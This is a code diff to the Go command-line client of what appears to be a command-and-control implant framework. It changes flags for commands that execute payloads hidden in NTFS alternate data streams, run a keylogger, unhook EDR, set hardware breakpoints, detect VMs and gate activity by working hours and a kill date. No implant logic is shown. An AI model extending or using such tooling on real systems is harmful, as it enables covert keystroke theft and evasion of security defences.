@@ -2217,6 +2217,7 @@ func init() {
 	adsCmd.AddCommand(adsWriteCmd)
 	adsCmd.AddCommand(adsReadCmd)
 	adsCmd.AddCommand(adsExecCmd)
+	adsExecCmd.Flags().String("ads-path", "", "ADS path (alternative to positional arg): e.g. C:\\legit.txt:payload.js")
 	adsExecCmd.Flags().Bool("wait", false, "Wait for execution result")
 	adsExecCmd.Flags().Int("timeout", 60, "Seconds to wait for result")
 
@@ -2318,8 +2319,10 @@ func init() {
 	keylogStartCmd.Flags().Int("duration", 0, "Auto-stop after N seconds (0 = run until stop)")
 	keylogStartCmd.Flags().Bool("wait", false, "Wait for start confirmation")
 	keylogStartCmd.Flags().Int("timeout", 15, "Seconds to wait")
-	keylogDumpCmd.Flags().Int("timeout", 15, "Seconds to wait for keystrokes")
-	keylogStopCmd.Flags().Int("timeout", 15, "Seconds to wait for final buffer")
+	keylogDumpCmd.Flags().Bool("wait", true, "Wait for keystrokes from agent")
+	keylogDumpCmd.Flags().Int("timeout", 60, "Seconds to wait for keystrokes")
+	keylogStopCmd.Flags().Bool("wait", true, "Wait for final buffer from agent")
+	keylogStopCmd.Flags().Int("timeout", 60, "Seconds to wait for final buffer")
 	keylogClearCmd.Flags().Bool("wait", false, "Wait for confirmation")
 	keylogClearCmd.Flags().Int("timeout", 10, "Seconds to wait")
 
@@ -2382,7 +2385,7 @@ func init() {
 	evasionSleepCmd.Flags().Int("timeout", 120, "Seconds to wait")
 
 	evasionUnhookCmd.Flags().Bool("wait", true, "Wait for unhook result")
-	evasionUnhookCmd.Flags().Int("timeout", 30, "Seconds to wait")
+	evasionUnhookCmd.Flags().Int("timeout", 60, "Seconds to wait")
 
 	evasionHWBPSetCmd.Flags().String("addr", "", "Hex address e.g. 0x7FFE1234 (required)")
 	evasionHWBPSetCmd.Flags().Uint8("register", 0, "DR register 0-3")
@@ -2411,8 +2414,8 @@ func init() {
 	opsecAntiVMCmd.Flags().Bool("wait", true, "Wait for check result")
 	opsecAntiVMCmd.Flags().Int("timeout", 30, "Seconds to wait")
 
-	opsecTimegateCmd.Flags().Int("start", 8, "Working hours start (0-23)")
-	opsecTimegateCmd.Flags().Int("end", 18, "Working hours end (0-23)")
+	opsecTimegateCmd.Flags().Int("work-start", 8, "Working hours start (0-23)")
+	opsecTimegateCmd.Flags().Int("work-end", 18, "Working hours end (0-23)")
 	opsecTimegateCmd.Flags().String("kill-date", "", "Kill date YYYY-MM-DD (empty = disabled)")
 	opsecTimegateCmd.Flags().Bool("wait", false, "Wait for result")
 	opsecTimegateCmd.Flags().Int("timeout", 15, "Seconds to wait")
